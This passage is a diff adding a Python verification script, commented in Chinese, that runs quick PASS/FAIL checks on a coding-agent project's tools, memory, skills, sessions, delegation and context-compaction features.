@@ -1,0 +1,3199 @@
+"""复刻检查清单的验证脚本：跑 24 项小检查，确认 agent 的核心功能还活着。
+
+本项目按复刻指南（11-scaffold.md）实现，这个脚本验收指南里「这些功能
+必须存在且能用」的清单——每项做一件小事（建个文件、发个工具调用），
+看结果对不对。适合改完代码后快速回归，比跑全量测试快得多。
+
+用法：
+    uv run python scripts/verify.py
+
+每项输出 PASS（通过）/ FAIL（失败）/ SKIPPED（跳过），最后给汇总。
+SKIPPED 的项需要真实 API key 才能验证。
+"""
+
+import asyncio
+import json
+import os
+import sys
+import tempfile
+from pathlib import Path
+from types import SimpleNamespace
+
+# 以脚本方式运行时 Python 只把 scripts/ 加进搜索路径，手动把项目根也加进去
+PROJECT_ROOT = Path(__file__).resolve().parent.parent
+sys.path.insert(0, str(PROJECT_ROOT))
+
+
+def _result(status, detail=""):
+    """拼一个检查结果字典。
+
+    参数：
+        status  结果状态："PASS" / "FAIL" / "SKIPPED"
+        detail  补充说明文字（会显示在终端）
+
+    返回：{"status": ..., "detail": ...} 字典。
+    """
+    return {"status": status, "detail": detail}
+
+
+def _ok(detail=""):
+    """生成一个 PASS 结果。参数 detail 为附带的说明文字。"""
+    return _result("PASS", detail)
+
+
+def _fail(detail=""):
+    """生成一个 FAIL 结果。参数 detail 为失败原因。"""
+    return _result("FAIL", detail)
+
+
+def _skip(detail=""):
+    """生成一个 SKIPPED 结果。参数 detail 为跳过原因。"""
+    return _result("SKIPPED", detail)
+
+
+# ---------------------------------------------------------------------------
+# 基础对话
+# ---------------------------------------------------------------------------
+
+def check_agent_initialization():
+    """验证 AIAgent 对象能正常创建（不发起任何真实 API 请求）。
+
+    返回：PASS/FAIL 结果。
+    """
+    from agent import AIAgent
+    agent = AIAgent(api_key="fake", model="test", enabled_toolsets=[])
+    return _ok(f"max_iter={agent.max_iterations}, budget={agent.iteration_budget.remaining}")
+
+
+def check_tool_definitions():
+    """验证工具定义能正常加载，且核心工具（terminal/read/write/memory）都在。
+
+    返回：PASS/FAIL 结果。
+    """
+    from model_tools import get_tool_definitions
+    tools = get_tool_definitions(["core"])
+    names = [t["function"]["name"] for t in tools]
+    expected = {"terminal", "read_file", "write_file", "memory"}
+    missing = expected - set(names)
+    if missing:
+        return _fail(f"缺少工具: {missing}")
+    return _ok(f"暴露 {len(names)} 个工具")
+
+
+def check_rules_param_equiv(tmp):
+    """验证 rules= 传参与无参调用判定一致（stat 风暴修复的前提）。"""
+    import os
+    os.environ["CODEAGENT_HOME"] = str(tmp / "rules_home")
+    try:
+        (tmp / "rules_home").mkdir(parents=True, exist_ok=True)
+        (tmp / "rules_home" / "settings.json").write_text(
+            '{"permissions": {"deny": ["terminal"]}}', encoding="utf-8")
+        from agent import tool_permissions as tp
+        tp.reset_rules_cache()
+        rules = tp.load_tool_permission_rules()
+        for name in ("terminal", "read_file"):
+            with_param = tp.is_tool_denied(name, rules=rules)
+            without_param = tp.is_tool_denied(name)
+            if with_param != without_param:
+                return _fail(f"{name}: 传参={with_param} 无参={without_param} 不一致")
+        if not tp.is_tool_denied("terminal", rules=rules):
+            return _fail("deny 规则没生效")
+        return _ok("rules 传参与无参判定一致")
+    finally:
+        os.environ.pop("CODEAGENT_HOME", None)
+        tp.reset_rules_cache()
+
+
+def check_tool_names_cache():
+    """验证工具名清单缓存：同键两调只扫一次 registry，generation 变化自动失效。
+
+    大白话：get_tool_definitions 里"算出本轮有哪些工具名"这段（toolset 展开 +
+    mcp 扫描 + deny 过滤）带缓存；registry.generation（每次登记/注销 +1）
+    是失效信号。这里三连测：注册新工具能立刻看见、同参数连调两次结果一致
+    且第二次不重扫、注销后立刻隐身。
+    """
+    from model_tools import get_tool_definitions
+    from tools.registry import registry
+
+    def _handler(args, **kw):
+        return '{"ok": true}'
+
+    # core 套餐是写死的静态名单，登记新工具不会进 resolve_toolset 的结果；
+    # 真正"动态"的名字来源是 mcp__ 扫描分支——探针得起 mcp__ 开头的名字才测得到
+    probe = "mcp__verify_cache__probe"
+    registry.register(
+        name=probe,
+        toolset="mcp",
+        schema={"type": "function", "function": {
+            "name": probe,
+            "description": "verify 专用探针",
+            "parameters": {"type": "object", "properties": {}},
+        }},
+        handler=_handler,
+        override=True,
+    )
+    try:
+        # 数 registry.list_all 被扫了几次：同键第二次调用应命中缓存、不再扫
+        orig_list_all = registry.list_all
+        scans = [0]
+
+        def _counting_list_all():
+            scans[0] += 1
+            return orig_list_all()
+
+        registry.list_all = _counting_list_all
+        try:
+            names = [t["function"]["name"] for t in get_tool_definitions(["core", "mcp"])]
+            names2 = [t["function"]["name"] for t in get_tool_definitions(["core", "mcp"])]
+        finally:
+            del registry.list_all  # 摘掉实例上的影子属性，恢复类里定义的原方法
+
+        if probe not in names:
+            return _fail("注册后清单没包含新工具（generation 失效没生效）")
+        if names != names2:
+            return _fail("两次结果不一致")
+        if scans[0] > 1:
+            return _fail(f"同键两调扫了 {scans[0]} 次 registry（缓存没生效）")
+
+        # 注销让 generation 再 +1：缓存必须跟着失效，名单里不能再有探针
+        registry.unregister(probe)
+        names3 = [t["function"]["name"] for t in get_tool_definitions(["core", "mcp"])]
+        if probe in names3:
+            return _fail("注销后清单还残留旧工具（generation 失效没生效）")
+        return _ok("名字解析缓存 + generation 失效正常")
+    finally:
+        registry.unregister(probe)
+
+
+def check_terminal_tool():
+    """验证 terminal 工具真的能执行一条命令（跑 echo 看输出）。
+
+    返回：PASS/FAIL 结果。
+    """
+    from tools.registry import registry
+    result = asyncio.run(registry.dispatch("terminal", {"command": "echo verify_ok"}))
+    data = json.loads(result)
+    if "verify_ok" in data.get("stdout", ""):
+        return _ok("echo 输出正确")
+    return _fail(f"输出异常: {data}")
+
+
+def check_read_file_tool(tmp):
+    """验证 read_file 工具能读回文件内容。
+
+    参数：
+        tmp  临时目录 Path，测试文件写在这底下
+
+    返回：PASS/FAIL 结果。
+    """
+    from tools.registry import registry
+    f = tmp / "sample.txt"
+    f.write_text("line1\nline2\n", encoding="utf-8")
+    result = asyncio.run(registry.dispatch("read_file", {"path": str(f)}))
+    data = json.loads(result)
+    if "line1" in data.get("content", ""):
+        return _ok("读取到内容")
+    return _fail(f"读取失败: {data}")
+
+
+def check_read_file_default_limit(tmp):
+    """验证不传 limit 默认读前 2000 行并给续读提示。
+
+    断言键名对齐 handler 真实返回形状：成功 JSON 含 content / total_lines /
+    shown_lines（形如 "1-2000"）/ hint（被截断时才有），没有 lines_read 字段。
+    外加两枚负例：显式传 limit、文件没截断，这两种情况都不该带 hint
+    （续读提示只属于「默认 limit 截断了」这一种，乱发会教坏模型瞎续读）。
+
+    参数：
+        tmp  临时目录 Path，测试文件写在这底下
+
+    返回：PASS/FAIL 结果。
+    """
+    from tools.registry import registry
+    f = tmp / "big3000.txt"
+    f.write_text("".join(f"line{i}\n" for i in range(3000)), encoding="utf-8")
+    result = asyncio.run(registry.dispatch("read_file", {"path": str(f)}))
+    data = json.loads(result)
+    if data.get("total_lines") != 3000:
+        return _fail(f"total_lines 不对: {data.get('total_lines')}")
+    if data.get("shown_lines") != "1-2000" or "line1999" not in data.get("content", ""):
+        return _fail("默认没截到 2000 行")
+    if "line2999" in data.get("content", ""):
+        return _fail("默认读了全文")
+    if "offset" not in data.get("hint", data.get("content", "")):
+        return _fail("缺续读提示")
+    # 显式 limit 行为不变：传 2500 就老老实实读 2500 行
+    r2 = asyncio.run(registry.dispatch("read_file", {"path": str(f), "limit": 2500}))
+    d2 = json.loads(r2)
+    if "line2499" not in d2.get("content", "") or "line2500" in d2.get("content", ""):
+        return _fail(f"显式 limit=2500 行为变了: {str(d2)[:120]}")
+    # 负例一：显式传了 limit 是模型自己点的菜，截断是预期内的，不带 hint
+    if "hint" in d2:
+        return _fail("显式 limit 路径不该带 hint")
+    # 负例二：小文件一口气读完、根本没截断，也没资格带 hint
+    f_small = tmp / "small.txt"
+    f_small.write_text("a\nb\nc\n", encoding="utf-8")
+    r3 = asyncio.run(registry.dispatch("read_file", {"path": str(f_small)}))
+    if "hint" in json.loads(r3):
+        return _fail("未截断时不该带 hint")
+    return _ok("read_file 默认 2000 行 + 续读提示正常")
+
+
+def check_interrupt():
+    """验证中断机制：调用 interrupt() 后，中断标志确实被设置
+    （用户按 Ctrl+C 优雅打断 agent 的底层开关）。
+
+    返回：PASS/FAIL 结果。
+    """
+    from agent import AIAgent
+    agent = AIAgent(api_key="fake", model="test", enabled_toolsets=[])
+    agent.interrupt()
+    if agent._interrupt_requested:
+        return _ok("中断标志已设置")
+    return _fail("中断标志未设置")
+
+
+# ---------------------------------------------------------------------------
+# 记忆系统
+# ---------------------------------------------------------------------------
+
+def check_memory_tool_write(tmp):
+    """验证 memory 工具能保存一条记忆并落盘。
+
+    参数：
+        tmp  临时目录 Path，当作隔离的 agent home 用（记忆写到 tmp/.memory/）
+
+    返回：PASS/FAIL 结果。
+    """
+    from tools.registry import registry
+    from agent.memory_store import MemoryStore
+    store = MemoryStore(codeagent_home=tmp)
+
+    result = asyncio.run(registry.dispatch(
+        "memory",
+        {"action": "save", "name": "验证测试", "description": "验证测试",
+         "type": "other", "body": "验证测试"},
+        memory_store=store,
+    ))
+    data = json.loads(result)
+    if data.get("success"):
+        entries = store.list_all()
+        if any("验证测试" in (e.body or "") for e in entries):
+            return _ok("已写入 .memory/")
+    return _fail(f"写入失败: {data}")
+
+
+def check_memory_persist(tmp):
+    """验证保存记忆后，磁盘上真的出现了记忆文件（.memory/ 目录或 MEMORY.md 索引）。
+
+    参数：
+        tmp  临时目录 Path，当作隔离的 agent home
+
+    返回：PASS/FAIL 结果。
+    """
+    from agent.memory_store import MemoryStore
+    store = MemoryStore(codeagent_home=tmp)
+    store.add("memory", "持久化测试")
+    # 存储是多文件模式：条目是 .memory/ 下的 .md 文件，MEMORY.md 只是索引
+    memory_dir = tmp / ".memory"
+    has_files = memory_dir.exists() and any(memory_dir.glob("*.md"))
+    if has_files or (tmp / "MEMORY.md").exists():
+        return _ok(".memory/ 已创建")
+    return _fail("记忆文件未创建")
+
+
+def check_memory_reload(tmp):
+    """验证记忆的持久性：新建一个 MemoryStore 实例（模拟重启），旧记忆还在。
+
+    参数：
+        tmp  临时目录 Path，当作隔离的 agent home
+
+    返回：PASS/FAIL 结果。
+    """
+    from agent.memory_store import MemoryStore
+    s1 = MemoryStore(codeagent_home=tmp)
+    s1.add("memory", "重启测试")
+
+    s2 = MemoryStore(codeagent_home=tmp)
+    entries = s2.list_all()
+    if any("重启测试" in (e.body or "") for e in entries):
+        return _ok("记忆已跨实例加载")
+    return _fail("记忆丢失")
+
+
+# ---------------------------------------------------------------------------
+# 技能系统
+# ---------------------------------------------------------------------------
+
+def _setup_skill(tmp):
+    """在临时目录里造一个名叫 hello 的示例技能，供技能类检查复用。
+
+    参数：
+        tmp  临时目录 Path，技能建在 tmp/skills/hello/
+
+    返回：技能库目录的 Path。
+    """
+    skills = tmp / "skills"
+    skills.mkdir(parents=True, exist_ok=True)
+    (skills / "hello").mkdir(parents=True, exist_ok=True)
+    (skills / "hello" / "SKILL.md").write_text(
+        '---\nname: hello\ndescription: "打招呼"\n---\n# Hello\n你好技能',
+        encoding="utf-8",
+    )
+    return skills
+
+
+def check_skill_trigger(tmp):
+    """验证技能能被发现，且触发时正文内容会被注入对话。
+
+    参数：
+        tmp  临时目录 Path（会先在里面造一个 hello 技能）
+
+    返回：PASS/FAIL 结果。
+    """
+    from agent.skill_commands import scan_skill_commands, execute_skill
+    skills = _setup_skill(tmp)
+    cmds = scan_skill_commands(skills)
+    if "/hello" not in cmds:
+        return _fail("技能未被发现")
+    injected = execute_skill(cmds["/hello"]["skill_md_path"], "test")
+    if "Hello" in injected:
+        return _ok("技能内容已注入")
+    return _fail("技能触发失败")
+
+
+def check_skills_list(tmp):
+    """验证 skills_list 工具能列出技能库里的技能。
+
+    参数：
+        tmp  临时目录 Path（会先造一个 hello 技能）
+
+    返回：PASS/FAIL 结果。
+    """
+    from tools.registry import registry
+    skills = _setup_skill(tmp)
+    result = asyncio.run(registry.dispatch("skills_list", {}, codeagent_home=tmp))
+    data = json.loads(result)
+    names = [s["name"] for s in data["skills"]]
+    if "hello" in names:
+        return _ok("列出了 hello 技能")
+    return _fail(f"未列出: {data}")
+
+
+def check_skill_view(tmp):
+    """验证 skill_view 工具能查看指定技能的内容。
+
+    参数：
+        tmp  临时目录 Path（会先造一个 hello 技能）
+
+    返回：PASS/FAIL 结果。
+    """
+    from tools.registry import registry
+    _setup_skill(tmp)
+    result = asyncio.run(registry.dispatch("skill_view", {"name": "hello"}, codeagent_home=tmp))
+    data = json.loads(result)
+    if "Hello" in data.get("content", ""):
+        return _ok("查看了 hello 技能")
+    return _fail(f"查看失败: {data}")
+
+
+def check_skill_manage_create(tmp):
+    """验证 skill_manage 工具能创建新技能（SKILL.md 真的出现在磁盘上）。
+
+    参数：
+        tmp  临时目录 Path，技能建在 tmp/skills/ 下
+
+    返回：PASS/FAIL 结果。
+    """
+    from tools.registry import registry
+    asyncio.run(registry.dispatch(
+        "skill_manage",
+        {"action": "create", "name": "new-skill", "content": "---\nname: x\n---\nbody"},
+        codeagent_home=tmp,
+    ))
+    if (tmp / "skills" / "new-skill" / "SKILL.md").exists():
+        return _ok("创建了 new-skill")
+    return _fail("创建失败")
+
+
+def check_usage_stats(tmp):
+    """验证技能使用统计：用一次技能后 .usage.json 里的计数会 +1。
+
+    参数：
+        tmp  临时目录 Path（会先造一个 hello 技能）
+
+    返回：PASS/FAIL 结果。
+    """
+    from tools.skill_usage import bump_use, load_usage
+    skills = _setup_skill(tmp)
+    bump_use(skills, "hello")
+    data = load_usage(skills)
+    if data.get("hello", {}).get("use_count") == 1:
+        return _ok("use_count=1")
+    return _fail("统计未记录")
+
+
+# ---------------------------------------------------------------------------
+# 会话存储
+# ---------------------------------------------------------------------------
+
+def check_sessions_db(tmp):
+    """验证会话存储初始化时会创建 .sessions/ 目录（JSONL 文件目录，
+    append-only 方便恢复；传 sessions.db 路径会自动转成该目录）。
+
+    参数：
+        tmp  临时目录 Path
+
+    返回：PASS/FAIL 结果。
+    """
+    from agent.session_store import SessionStore
+    db = tmp / "sessions.db"
+    store = SessionStore(db)
+    # 兼容老参数：传 sessions.db 路径会自动转成 .sessions/ 目录
+    sessions_dir = tmp / ".sessions"
+    if sessions_dir.exists():
+        return _ok(str(sessions_dir))
+    return _fail("会话目录未创建")
+
+
+def check_session_search(tmp):
+    """验证 session_search 工具能搜到历史对话内容。
+
+    参数：
+        tmp  临时目录 Path，会话存在这底下
+
+    返回：PASS/FAIL 结果。
+    """
+    from agent.session_store import SessionStore
+    from tools.registry import registry
+    store = SessionStore(tmp / "s.db")
+    sid = store.create_session()
+    store.append_message(sid, "user", "Python 测试内容")
+
+    result = asyncio.run(registry.dispatch(
+        "session_search",
+        {"query": "Python"},
+        session_store=store,
+    ))
+    data = json.loads(result)
+    if data.get("total", 0) > 0:
+        return _ok(f"找到 {data['total']} 条")
+    return _fail("未搜到")
+
+
+# ---------------------------------------------------------------------------
+# Curator
+# ---------------------------------------------------------------------------
+
+def check_curator_status(tmp):
+    """验证读取 curator 状态不报错（状态为空也是正常情况）。
+
+    参数：
+        tmp  临时目录 Path
+
+    返回：PASS/FAIL 结果。
+    """
+    from agent.curator import load_state
+    state = load_state(tmp / "skills")
+    # 从未跑过 curator 时状态文件不存在，返回空 dict 也算通过
+    return _ok(f"state keys: {list(state.keys()) or '(空)'}")
+
+
+def check_curator_dry_run(tmp):
+    """验证 curator 的 dry-run 模式：只预览要做的转换，不动文件。
+
+    参数：
+        tmp  临时目录 Path
+
+    返回：PASS/FAIL 结果。
+    """
+    from agent.curator import run_curator_review
+    skills = tmp / "skills"
+    skills.mkdir(parents=True, exist_ok=True)
+    report = run_curator_review(skills, dry_run=True)
+    if report["dry_run"] is True:
+        return _ok(f"transitions={report['transitions']}")
+    return _fail("dry_run 标志错误")
+
+
+def check_curator_archive(tmp):
+    """验证技能归档：archive 后技能目录从原地消失、出现在 .archive/ 下
+    （「完全可逆」铁律——归档不删除，只是挪到 .archive/ 藏起来）。
+
+    参数：
+        tmp  临时目录 Path
+
+    返回：PASS/FAIL 结果。
+    """
+    from tools.skill_usage import archive_skill, mark_agent_created, bump_use
+    skills = tmp / "skills"
+    skills.mkdir(parents=True, exist_ok=True)
+    (skills / "old").mkdir(parents=True, exist_ok=True)
+    (skills / "old" / "SKILL.md").write_text("# old\n", encoding="utf-8")
+    bump_use(skills, "old")
+    mark_agent_created(skills, "old")
+
+    ok, _ = archive_skill(skills, "old")
+    if ok and (skills / ".archive" / "old").exists():
+        return _ok("已归档到 .archive/")
+    return _fail("归档失败")
+
+
+def check_curator_restore(tmp):
+    """验证归档可逆：restore 能把 .archive/ 里的技能放回原位。
+
+    参数：
+        tmp  临时目录 Path
+
+    返回：PASS/FAIL 结果。
+    """
+    from tools.skill_usage import archive_skill, restore_skill, bump_use
+    skills = tmp / "skills"
+    skills.mkdir(parents=True, exist_ok=True)
+    (skills / "lost").mkdir(parents=True, exist_ok=True)
+    (skills / "lost" / "SKILL.md").write_text("# lost\n", encoding="utf-8")
+    bump_use(skills, "lost")
+
+    archive_skill(skills, "lost")
+    ok, _ = restore_skill(skills, "lost")
+    if ok and (skills / "lost").exists():
+        return _ok("已恢复")
+    return _fail("恢复失败")
+
+
+# ---------------------------------------------------------------------------
+# 委托
+# ---------------------------------------------------------------------------
+
+def check_delegate_sync(tmp):
+    """验证 subagent 同步委托链路（用假实现替掉子代理，不真跑 LLM）。
+
+    参数：
+        tmp  临时目录 Path（本项未用到，保持签名统一）
+
+    返回：PASS/FAIL 结果。
+    """
+    from unittest.mock import patch
+    from tools.registry import registry
+    with patch("tools.delegate_tool._run_child", return_value="子代理完成"):
+        result = asyncio.run(registry.dispatch(
+            "subagent",
+            {"goal": "测试任务"},
+            base_url=None, api_key="fake", model="test",
+        ))
+    data = json.loads(result)
+    if data.get("success") and data.get("result") == "子代理完成":
+        return _ok("同步委托 OK")
+    return _fail(f"委托失败: {data}")
+
+
+def check_delegate_batch(tmp):
+    """验证 subagent 批量模式：一次派 3 个任务并全部拿到结果（假实现，不真跑）。
+
+    参数：
+        tmp  临时目录 Path（本项未用到，保持签名统一）
+
+    返回：PASS/FAIL 结果。
+    """
+    from unittest.mock import patch
+    from tools.registry import registry
+    with patch("tools.delegate_tool._run_child", return_value="ok"):
+        result = asyncio.run(registry.dispatch(
+            "subagent",
+            {"tasks": [{"goal": "a"}, {"goal": "b"}, {"goal": "c"}]},
+            base_url=None, api_key="fake", model="test",
+        ))
+    data = json.loads(result)
+    if data["mode"] == "batch" and len(data["results"]) == 3:
+        return _ok("3 个任务并行完成")
+    return _fail(f"批量失败: {data}")
+
+
+def check_compact_boundary_marker():
+    """验证压缩边界占位统一带 [COMPACT_BOUNDARY] 大写前缀且可被一次性取走。
+
+    旧 bug：生成方写小写 [compact_boundary]，恢复侧/持久化侧只认大写或
+    旧前缀——边界从不落库，重启后全量载入撑爆上下文。
+    """
+    from agent.context_pipeline import (
+        _build_compact_boundary, reactive_compact,
+        take_last_compact_placeholder,
+    )
+    # 1) L4 边界标注块以大写前缀开头
+    text = _build_compact_boundary("消息 1-50", "最近 30 条", transcript_path=None)
+    if not text.startswith("[COMPACT_BOUNDARY]"):
+        return _fail(f"边界标注缺大写前缀: {text[:40]!r}")
+    # 2) reactive 占位同样带前缀，且成功后可被一次性取走
+    fake_state = SimpleNamespace(reactive_last_at=0.0, reactive_count=0)
+    msgs = [{"role": "system", "content": "s"}] + [
+        {"role": "user", "content": f"m{i}"} for i in range(20)
+    ]
+    new_msgs, changed = reactive_compact(msgs, session_state=fake_state)
+    if not changed:
+        return _fail("reactive_compact 未触发")
+    first = new_msgs[1]["content"]
+    if not first.startswith("[COMPACT_BOUNDARY]"):
+        return _fail(f"reactive 占位缺前缀: {first[:40]!r}")
+    taken = take_last_compact_placeholder()
+    if not taken or not taken.startswith("[COMPACT_BOUNDARY]"):
+        return _fail(f"一次性取走失败: {str(taken)[:40]!r}")
+    if take_last_compact_placeholder() is not None:
+        return _fail("取走后应清空（一次性消费），第二次应返回 None")
+    return _ok("边界占位前缀统一 + 暂存机制正常")
+
+
+def check_compact_boundary_persist(tmp):
+    """验证边界占位能落进会话库、恢复裁剪能按它工作（E2E 无 LLM 版）。
+
+    用 reactive_compact 造出占位 → 走持久化函数落进假会话库 →
+    按 cli 的恢复裁剪逻辑载入——验证「压缩→落库→恢复裁剪」全链。
+    """
+    from agent.context_pipeline import (
+        reactive_compact, take_last_compact_placeholder,
+        _persist_compact_marker,
+    )
+    from cli import _truncate_at_last_compact_boundary
+
+    # 假会话库：只记录调用（不真写盘）
+    recorded = []
+    fake_store = SimpleNamespace(
+        append_message=lambda sid, role, content, **kw: recorded.append(
+            (sid, role, content)),
+    )
+    fake_state = SimpleNamespace(reactive_last_at=0.0, reactive_count=0)
+    msgs = [{"role": "system", "content": "s"}] + [
+        {"role": "user", "content": f"m{i}"} for i in range(20)
+    ]
+    new_msgs, changed = reactive_compact(msgs, session_state=fake_state)
+    if not changed:
+        return _fail("reactive_compact 未触发")
+    placeholder_content = take_last_compact_placeholder()
+    if not placeholder_content:
+        return _fail("占位暂存被提前消费了")
+    _persist_compact_marker(fake_store, "s1", placeholder_content)
+    if len(recorded) != 1 or recorded[0][0] != "s1":
+        return _fail(f"落库记录不对: {recorded}")
+
+    # 恢复裁剪：库里 = 旧消息 + START + 边界占位 + 尾部新消息；
+    # 尾部再塞一条 START，模拟「中断后又手动压缩过」的混合态
+    db_msgs = (
+        [{"role": "user", "content": "旧消息1"}, {"role": "assistant", "content": "旧答1"}]
+        + [{"role": "user", "content": "[COMPACT_START] L4 开跑"}]
+        + [{"role": "user", "content": recorded[0][2]}]
+        + [{"role": "user", "content": "压缩后的新消息"},
+           {"role": "user", "content": "[COMPACT_START] 又一次没跑完"}]
+    )
+    loaded = _truncate_at_last_compact_boundary(db_msgs)
+    contents = [m["content"] for m in loaded]
+    if "旧消息1" in contents:
+        return _fail("边界之前的旧消息没被裁掉")
+    if "压缩后的新消息" not in contents:
+        return _fail("边界之后的新消息丢了")
+    if any(c.startswith("[COMPACT_BOUNDARY]") for c in contents):
+        return _fail("边界标记行应被剥掉（摘要正文保留）")
+    if any(c.startswith("[COMPACT_START]") for c in contents):
+        return _fail("孤立的 [COMPACT_START] 没被剔除（会当废话发给模型）")
+    summary_body = recorded[0][2].replace("[COMPACT_BOUNDARY]\n", "", 1)
+    if not any(summary_body in c for c in contents):
+        return _fail("摘要正文丢了（边界消息可能被整条跳过——切片下标错位）")
+    return _ok("压缩→落库→恢复裁剪全链正常（含 START 剔除）")
+
+
+def check_summary_input_fidelity():
+    """验证 L4 摘要输入保真：工具参数进场、结果头尾、offload 指针、ephemeral 过滤。
+
+    摘要 prompt 要求「文件路径/错误消息逐字保留」，但旧版排版把工具调用
+    参数整个丢掉、结果只留头 200 字符——摘要层是无米之炊。
+    """
+    from agent.context_compressor import _format_dialog_for_summary
+    offload_json = json.dumps({
+        "truncated": True, "orig_chars": 90000,
+        "preview": "P" * 2000,
+        "full_at": r"D:\home\.task_outputs\tool-results\call_abc.txt",
+        "hint": "完整结果已落盘",
+    }, ensure_ascii=False)
+    msgs = [
+        {"role": "user", "content": "帮我修 login.py 的 bug"},
+        {"role": "assistant", "content": "", "tool_calls": [{
+            "id": "c1", "function": {
+                "name": "read_file",
+                "arguments": json.dumps(
+                    {"path": "D:/project/src/login.py", "offset": 100},
+                    ensure_ascii=False),
+            },
+        }]},
+        {"role": "tool", "content": "头部分析结论…\n" + "X" * 800 + "\nTraceback 错误在尾部"},
+        {"role": "tool", "content": offload_json},
+        {"role": "user", "content": "<background_tasks_running>3</background_tasks_running>",
+         "_ephemeral": True},
+    ]
+    out = _format_dialog_for_summary(msgs)
+    # 1) 工具参数进场（文件路径可见）
+    if "D:/project/src/login.py" not in out:
+        return _fail("工具调用参数没进摘要输入（文件路径丢了）")
+    if "read_file" not in out:
+        return _fail("工具名丢了")
+    # 2) 结果头尾保留（错误在尾部）
+    if "头部分析结论" not in out or "Traceback 错误在尾部" not in out:
+        return _fail("工具结果头尾没都保留（尾部报错丢了）")
+    # 3) offload 占位的 full_at 指针存活
+    if "call_abc.txt" not in out:
+        return _fail("offload 占位的 full_at 指针被截丢了")
+    # 4) ephemeral 瞬时消息不进摘要
+    if "background_tasks_running" in out:
+        return _fail("ephemeral 瞬时消息混进了摘要输入")
+    return _ok("摘要输入原料保真")
+
+
+def check_token_estimation_and_threshold():
+    """验证 CJK 感知估算、窗口对齐阈值、锚点口径三件套。
+
+    旧版 chars÷3 对纯中文低估约一半（压得太晚→顶线 PTL→紧急截断丢信息）；
+    L4 默认阈值 10 万对 64k 窗口的 DeepSeek 形同虚设。
+    """
+    from agent.context_compressor import estimate_message_tokens
+    # 1) 纯中文 200 字：旧公式给 66，实际 120~300——新公式应 >=150（不再低估）
+    cn = estimate_message_tokens([{"role": "user", "content": "汉" * 200}])
+    if cn < 150:
+        return _fail(f"中文仍低估: {cn}")
+    # 2) 纯 ASCII 400 字：应约 100（÷4），不能暴涨
+    en = estimate_message_tokens([{"role": "user", "content": "a" * 400}])
+    if not (80 <= en <= 140):
+        return _fail(f"ASCII 估算异常: {en}")
+    # 3) 工具调用参数也计费
+    with_args = estimate_message_tokens([{
+        "role": "assistant", "content": "",
+        "tool_calls": [{"function": {"arguments": "b" * 400}}],
+    }])
+    if with_args < 80:
+        return _fail(f"tool_calls 参数没计进: {with_args}")
+    # 4) 阈值对齐窗口：DeepSeek(64k) 封顶 0.9 窗口
+    #    （_get_model_max_tokens 对 deepseek 返回 65536，0.9 倍 = 58982）
+    from agent.context_pipeline import _effective_llm_compact_threshold
+    ds = _effective_llm_compact_threshold({}, "deepseek-chat")
+    if ds != 58982:
+        return _fail(f"DeepSeek 阈值应为 58982（65536×0.9）: {ds}")
+    big = _effective_llm_compact_threshold({}, "claude-x[1m]")
+    if big != 700000:
+        return _fail(f"1M 模型阈值应为 700000（保现行行为）: {big}")
+    claude = _effective_llm_compact_threshold({}, "claude-3-5-sonnet")
+    if claude != 100000:
+        return _fail(f"200k 窗口模型维持配置默认 100000: {claude}")
+    # 5) 锚点口径：DeepSeek 命名（prompt_tokens 已含缓存命中/未命中）不双计
+    from agent import AIAgent
+    agent = AIAgent(api_key="fake", model="t", enabled_toolsets=[])
+    usage = SimpleNamespace(
+        prompt_tokens=8000,
+        prompt_cache_hit_tokens=5000,
+        prompt_cache_miss_tokens=3000,
+        completion_tokens=10,
+    )
+    resp = SimpleNamespace(usage=usage, model="deepseek-chat")
+    agent._record_llm_usage(resp, sent_message_count=10)
+    anchor = agent._last_usage_anchor
+    if not anchor or anchor[1] != 8000:
+        return _fail(f"DeepSeek 锚点应取 prompt_tokens=8000（旧版会双计成 16000）: {anchor}")
+    return _ok("CJK 估算 + 窗口对齐 + 锚点口径正常")
+
+
+def check_dispatch_output_cap(tmp):
+    """验证 dispatch 层统一输出封顶：没自觉接 offload 的工具也会被兜底。
+
+    造一个返回 10 万字符的临时工具直接走 handle_function_call 总出口，
+    结果应自动落盘（含 preview/full_at），文件真实存在。
+    """
+    import asyncio as _aio
+    from tools.registry import registry
+    from model_tools import handle_function_call
+
+    def _big_handler(args, **kw):
+        return "X" * 100000
+
+    # 临时工具用完就注销（finally 兜底）——不注销的话它会留在全局注册表
+    # 里污染后续检查项（工具集多了仓名工具，schema 白花 token）。
+    try:
+        registry.register(
+            name="verify_big_output",
+            toolset="core",
+            schema={
+                "type": "function",
+                "function": {
+                    "name": "verify_big_output",
+                    "description": "verify 专用：返回超长文本",
+                    "parameters": {"type": "object", "properties": {}},
+                },
+            },
+            handler=_big_handler,
+            override=True,
+        )
+        result = _aio.run(handle_function_call(
+            "verify_big_output", {},
+            tool_call_id="verify_cap_call_1",
+            codeagent_home=tmp,
+            config={},
+        ))
+        try:
+            data = json.loads(result)
+        except json.JSONDecodeError:
+            return _fail(f"结果不是 JSON: {result[:120]!r}")
+        if not data.get("truncated") or "full_at" not in data:
+            return _fail(f"大输出没被统一封顶: {str(data)[:150]!r}")
+        if not Path(data["full_at"]).exists():
+            return _fail(f"落盘文件不存在: {data['full_at']}")
+        if "X" * 50 not in data.get("preview", ""):
+            return _fail("预览内容不对")
+        return _ok(f"统一封顶生效（{data['orig_chars']} 字符落盘）")
+    finally:
+        registry.unregister("verify_big_output")
+
+
+def check_delegate_offload(tmp):
+    """验证子代理结果先落盘再摘要：父代理想看细节时有 full_at 可读回。"""
+    from tools.delegate_tool import _offload_child_result, _attach_full_result_pointer
+    result = "子代理跑了很久的调研结果" + "Y" * 3000
+    kwargs = {
+        "tool_call_id": "verify_delegate_call_1",
+        "codeagent_home": tmp,
+        "task_id": "t-9",
+    }
+    off = _offload_child_result(result, kwargs)
+    if not off:
+        return _fail("没有产出 offload 占位")
+    data = json.loads(off)
+    if not data.get("full_at") or data.get("orig_chars") != len(result):
+        return _fail(f"占位字段不对: {str(data)[:150]!r}")
+    if not Path(data["full_at"]).exists():
+        return _fail(f"原文没落盘: {data['full_at']}")
+    final = _attach_full_result_pointer("[摘要] 调研完成，结论X", off)
+    if "full_at" not in final or data["full_at"] not in final:
+        return _fail(f"摘要没带上找回指针: {final[-120:]!r}")
+    return _ok("子代理结果落盘+指针正常")
+
+
+def check_memory_retrieval_fallback():
+    """验证记忆检索兜底：关键词匹配 + ID 纠错（aux LLM 单点时的保底）。"""
+    from agent.memory_retriever import keyword_fallback_ids, correct_memory_id
+    # 索引行用真实链接格式（.memory/{topic}.jsonl#{uid}）——_ID_IN_LINE
+    # 锚定 .jsonl#，不认裸 (topic#uid) 写法；主题名按链接裁剪后应还原出
